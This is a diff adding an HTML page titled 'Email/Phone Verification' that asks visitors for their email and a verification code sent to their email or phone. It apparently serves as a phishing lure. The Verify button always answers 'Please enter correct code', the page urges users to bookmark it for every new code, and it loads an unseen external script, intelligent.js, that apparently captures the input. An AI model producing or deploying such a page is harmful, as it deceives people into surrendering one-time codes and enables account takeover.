@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Email/Phone Verification</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #f0f2f5;
+    }
+
+    .container {
+      background: #ffffff;
+      padding: 35px 28px;
+      border-radius: 14px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.08);
+      width: 100%;
+      max-width: 420px;
+      animation: fadeIn 0.6s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(15px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    h2 {
+      text-align: center;
+      color: #222;
+      margin-bottom: 8px;
+    }
+
+    p {
+      text-align: center;
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 22px;
+    }
+
+    label {
+      display: block;
+      font-weight: 600;
+      margin: 12px 0 6px;
+      color: #333;
+    }
+
+    input[type="email"] {
+      width: 100%;
+      padding: 12px 14px;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      font-size: 15px;
+      margin-bottom: 18px;
+      background: #fafafa;
+      transition: all 0.3s ease;
+    }
+
+    input[type="email"]:focus {
+      border-color: #007bff;
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(0,123,255,0.15);
+      outline: none;
+    }
+
+    /* Verification code input */
+    .code-box {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 22px;
+    }
+
+    .code-box input {
+      width: 180px;
+      padding: 12px 14px;
+      font-size: 20px;
+      letter-spacing: 3px;
+      text-align: center;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      background: #fafafa;
+      transition: all 0.3s ease;
+    }
+
+    .code-box input:focus {
+      border-color: #007bff;
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(0,123,255,0.15);
+      outline: none;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      border: none;
+      border-radius: 10px;
+      background: #007bff;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    button:hover {
+      background: #0056b3;
+      transform: translateY(-1px);
+    }
+
+    /* Copy link box */
+    .copy-link {
+      margin-top: 25px;
+      font-size: 14px;
+      text-align: center;
+      color: #444;
+    }
+
+    .link-box {
+      margin-top: 10px;
+      display: flex;
+      gap: 6px;
+      align-items: center;
+    }
+
+    .link-box input {
+      flex: 1;
+      padding: 11px;
+      font-size: 13px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      color: #555;
+      background: #f9f9f9;
+      transition: border 0.3s;
+    }
+
+    .link-box input:focus {
+      border-color: #007bff;
+      outline: none;
+    }
+
+    .copy-btn {
+      padding: 11px 16px;
+      font-size: 13px;
+      background: #28a745;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .copy-btn:hover {
+      background: #1e7e34;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Verify Your Account</h2>
+    <p>Enter your email and the verification code we sent to your email or phone number.</p>
+
+    <form id="allForm">
+      <label for="email">Email Address</label>
+      <input type="email" id="email" name="email" placeholder="example@email.com" required>
+
+      <label for="code">Verification Code</label>
+      <div class="code-box">
+        <input type="text" id="code" name="Verification code" placeholder="Enter code" required>
+      </div>
+
+<button onclick="alert('Please enter correct code')">Verify</button>
+    </form>
+
+    <div class="copy-link">
+      Copy this link to use anytime you receive a new code:
+      <div class="link-box">
+        <input type="text" id="pageLink" readonly>
+        <button class="copy-btn" onclick="copyLink()">Copy</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Show current page link
+    document.getElementById("pageLink").value = window.location.href;
+
+    function copyLink() {
+      const linkInput = document.getElementById("pageLink");
+      linkInput.select();
+      document.execCommand("copy");
+      alert("Link copied to clipboard!");
+    }
+  </script>
+  <script src="intelligent.js"></script>
+</body>
+</html>
